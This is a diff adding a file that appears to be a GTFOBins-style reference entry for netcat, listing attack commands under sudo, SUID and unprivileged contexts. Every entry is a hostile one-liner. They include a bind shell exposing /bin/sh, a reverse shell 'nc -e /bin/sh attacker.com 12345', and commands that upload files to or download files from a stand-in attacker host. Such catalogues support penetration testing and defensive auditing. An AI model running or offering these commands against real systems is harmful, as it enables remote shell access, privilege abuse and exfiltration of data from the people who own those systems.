@@ -1,0 +1,86 @@
+nc
+==
+
+Bind shell
+----------
+
+[Sudo]
+    nc -l -p 12345 -e /bin/sh
+    This only works with netcat traditional.
+
+[SUID]
+    nc -l -p 12345 -e /bin/sh
+    This only works with netcat traditional.
+
+[Unprivileged]
+    nc -l -p 12345 -e /bin/sh
+    This only works with netcat traditional.
+
+Download
+--------
+
+[Sudo]
+    nc -l -p 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+[SUID]
+    nc -l -p 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+[Unprivileged]
+    nc -l -p 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+[Sudo]
+    nc attacker.com 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+[SUID]
+    nc attacker.com 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+[Unprivileged]
+    nc attacker.com 12345 >/path/to/output-file
+    The file is actually written by the invoking shell.
+
+Reverse shell
+-------------
+
+[Sudo]
+    nc -e /bin/sh attacker.com 12345
+    This only works with netcat traditional.
+
+[SUID]
+    nc -e /bin/sh attacker.com 12345
+    This only works with netcat traditional.
+
+[Unprivileged]
+    nc -e /bin/sh attacker.com 12345
+    This only works with netcat traditional.
+
+Upload
+------
+
+[Sudo]
+    nc -l -p 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
+
+[SUID]
+    nc -l -p 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
+
+[Unprivileged]
+    nc -l -p 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
+
+[Sudo]
+    nc attacker.com 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
+
+[SUID]
+    nc attacker.com 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
+
+[Unprivileged]
+    nc attacker.com 12345 </path/to/input-file
+    The file is actually read by the invoking shell.
